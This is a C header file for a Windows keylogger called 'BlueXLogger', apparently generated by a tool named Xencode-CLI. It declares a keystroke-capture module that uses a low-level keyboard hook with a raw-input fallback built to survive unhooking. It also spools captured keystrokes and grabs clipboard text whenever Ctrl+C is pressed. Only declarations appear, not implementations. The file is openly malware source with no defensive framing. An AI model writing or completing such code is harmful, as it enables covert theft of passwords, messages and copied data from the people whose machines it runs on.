/*============================================================================
 * BlueXLogger - bxl_capture.h
 * Low-level keyboard capture with a Raw Input fallback path.
 *
 * Created by Xencode-CLI by xanthorox
 *
 * Threading model
 * ---------------
 * A dedicated capture thread installs the WH_KEYBOARD_LL hook and runs the
 * message pump the hook requires. The hook procedure itself does no I/O: it
 * pushes a fixed-size record into a ring buffer and signals an event.
 *
 * The worker thread drains that ring, formats the text and writes to the
 * spool. This keeps hook latency in the microsecond range, which is what
 * stops the OS from silently unhooking a slow callback.
 *
 * Raw Input (WM_INPUT with RIDEV_INPUTSINK) is registered alongside the hook
 * but is only *used* when the hook has stopped reporting - i.e. when it was
 * removed by another process or the OS. That gives a genuine fallback without
 * double-logging every keystroke.
 *==========================================================================*/
#ifndef BXL_CAPTURE_H
#define BXL_CAPTURE_H

#include "bxl_common.h"
#include "bxl_format.h"

#define BXL_CAP_QUEUE        4096
#define BXL_HOOK_DEAD_MS     3000   /* hook considered dead after this gap   */

typedef struct BxlCapture {
    /* Capture thread */
    HANDLE   thread;
    DWORD    thread_id;
    HANDLE   ready_evt;
    HANDLE   stop_evt;
    HINSTANCE hinst;
    HWND     msg_hwnd;
    HHOOK    hook;
    int      raw_registered;

    /* Event ring (producer: capture thread, consumer: worker) */
    BxlKeyEvent       q[BXL_CAP_QUEUE];
    volatile LONG     q_head;
    volatile LONG     q_tail;
    volatile LONG     q_dropped;
    CRITICAL_SECTION  cs;

    /* Worker wake-up */
    HANDLE   data_evt;

    /* Ctrl+C clipboard probe request */
    volatile LONG clipboard_request;

    /* Health / diagnostics */
    volatile LONG last_hook_ms;
    volatile LONG last_raw_ms;
    volatile LONG hook_count;
    volatile LONG raw_count;
    volatile LONG hook_dead;

    int running;
    int enable_raw;
} BxlCapture;

/* Start the capture thread. Returns BXL_TRUE when the hook is installed. */
int  bxl_capture_start(BxlCapture *c, int enable_raw);

/* Stop the thread and release every resource. */
void bxl_capture_stop(BxlCapture *c);

/* Event handle signalled whenever new events are queued. */
HANDLE bxl_capture_event(const BxlCapture *c);

/* Pop up to max events. Returns the number written to evs. */
int  bxl_capture_drain(BxlCapture *c, BxlKeyEvent *evs, int max);

/* Non-zero (and cleared) when a Ctrl+C was observed since the last call. */
int  bxl_capture_take_clipboard_request(BxlCapture *c);

/* True when the hook is being bypassed in favour of raw input. */
int  bxl_capture_hook_is_dead(const BxlCapture *c);

void bxl_capture_stats(const BxlCapture *c, unsigned *hook_events,
                       unsigned *raw_events, unsigned *dropped);

/* Read the clipboard as UTF-8 text. Returns BXL_TRUE when text was read. */
int  bxl_read_clipboard(char *out, size_t out_cch);

#endif /* BXL_CAPTURE_H */
